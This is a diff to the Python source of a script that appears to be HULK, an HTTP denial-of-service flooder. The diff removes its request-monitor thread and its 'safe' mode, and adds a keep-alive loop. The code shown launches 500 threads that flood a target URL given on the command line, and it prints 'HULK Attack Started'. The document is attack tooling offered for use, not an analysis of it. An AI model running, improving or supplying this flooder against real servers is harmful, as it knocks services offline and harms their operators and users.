@@ -12,6 +12,7 @@ import sys
 import threading
 import random
 import re
+import time
 
 #global params
 url=''
@@ -124,18 +125,7 @@ class HTTPThread(threading.Thread):
 		except Exception, ex:
 			pass
 
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
-				previous=request_counter
-		if flag==2:
-			print "\n-- HULK Attack Finished --"
-
-#execute 
+#execute
 if len(sys.argv) < 2:
 	usage()
 	sys.exit()
@@ -145,17 +135,19 @@ else:
 		sys.exit()
 	else:
 		print "-- HULK Attack Started --"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
+		t_list = []
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
-		t = MonitorThread()
-		t.start()
+		try:
+			while True:
+				time.sleep(2)
+		except KeyboardInterrupt:
+			server_down_count = 11
+			sys.exit()
 
